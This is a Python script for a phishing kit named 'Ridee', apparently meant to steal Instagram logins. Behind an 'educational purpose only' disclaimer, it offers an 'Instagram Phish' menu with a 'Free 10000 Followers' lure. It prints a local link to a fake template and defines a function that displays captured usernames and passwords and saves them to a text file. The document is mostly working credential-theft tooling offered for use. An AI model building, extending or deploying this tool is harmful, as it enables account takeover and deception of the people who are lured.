from colorama import Fore
import time
import os
import sys

def clear():
    if os.name == "nt": 
        os.system("cls")
    else:
        os.system("clear")

def style():
    clear()
    print(f"{Fore.GREEN}Welcome to Ridee!")
    for i in range(50):
        time.sleep(0.009)
        print(f"{Fore.YELLOW}*", end="", flush=True)

    print("\n")

    disclaimer = f"""{Fore.RED}
    [!] {Fore.GREEN}EDUCATIONAL PURPOSE ONLY
    {Fore.LIGHTWHITE_EX}'Ridee is intended for educational and authorized testing purposes only.
    Users are solely responsible for how they use this tool.
    The developer does not endorse or accept responsibility for misuse,
    unauthorized activities, or violations of applicable laws.
    Use responsibly and only with proper authorization.'"""
    print(disclaimer.strip().replace("  ", ""))
    print("\n")
    for i in range(50):
            time.sleep(0.009)
            print(f"{Fore.YELLOW}*", end="", flush=True)
    
    print("\n")

    access = input(f"{Fore.WHITE}Continue (y/n) ")
    if access == "y":
         pass
    else:
         exit()
    
    clear()

    asii_text = f"""{Fore.RED}
    ███████ ████  █████   ██████ ██████
    ██   ██  ██   ██  ██  ██     ██    
    ███████  ██   ██   █▌ █████  █████ 
    █████▄   ██   ██  ██▌ ██▌    ██▌   
    ██▌ ▀██ ████▌ █████ ▌ ██████ ██████
    ▌         ▌    ██ ▌  ██     ██   
                    ▐     ▐      ▐   """
    print(asii_text)
    copyright = f"""{Fore.MAGENTA}
    ------------------------------------------------------------\n
    {Fore.RED}Author {Fore.WHITE}: {Fore.GREEN}Basant
    {Fore.RED}Telegram {Fore.WHITE}: {Fore.GREEN}@alphaxworks\n {Fore.MAGENTA}
    -------------------------------------------------------------"""
    print(copyright)

style()

service = []

def menu():
     options = input(f"""{Fore.RED}
    [0] {Fore.CYAN}Instagram Phish
    
    {Fore.WHITE}Choose a service! """)
     if options == "0":
          service.append(0)
          clear()
          text = f"""    {Fore.BLUE}                                                                               
██ ▄▄  ▄▄  ▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄   ▄▄▄▄ ▄▄▄▄   ▄▄▄  ▄▄   ▄▄   █████▄ ▄▄ ▄▄ ▄▄  ▄▄▄▄ ▄▄ ▄▄ ▄▄▄▄▄ ▄▄▄▄  
██ ███▄██ ███▄▄   ██  ██▀██ ██ ▄▄ ██▄█▄ ██▀██ ██▀▄▀██   ██▄▄█▀ ██▄██ ██ ███▄▄ ██▄██ ██▄▄  ██▄█▄ 
██ ██ ▀██ ▄▄██▀   ██  ██▀██ ▀███▀ ██ ██ ██▀██ ██   ██   ██     ██ ██ ██ ▄▄██▀ ██ ██ ██▄▄▄ ██ ██ 
                                                                                                """

          print(text)
          services = input(f"""
          {Fore.RED}[0] {Fore.GREEN}Free 10000 Followers
          """)
          if services == "0":
               service.append(0)
               print(f"{Fore.RED}Link : {Fore.GREEN}http://127.0.0.1:3000/instagram/followers/template.html")
          
menu()

def send_credentials(username, password):
     print(f"""{Fore.RESET}
     ################################################################
     ## {Fore.YELLOW}> Username : {Fore.CYAN}{username}            
     #                                                             |
     ## {Fore.YELLOW}> Password : {Fore.CYAN}{password}            
     #                                                             |    
     ################################################################
     {Fore.RESET}""")
     try:
          file = open("user.txt", "w")
          file.write(f"(Username : {username}, password : {password})")
          file.close()
          print("Saved to 'user.txt'")
     except:
          filename = input("'user.txt' already exists, which filename would you save these credentials? ")
          file = open(f"{filename}.txt", "w")
          file.write(f"\n(Username : {username}, password : {password})")
          file.close()
          print(f"Saved to '{filename}.txt'")

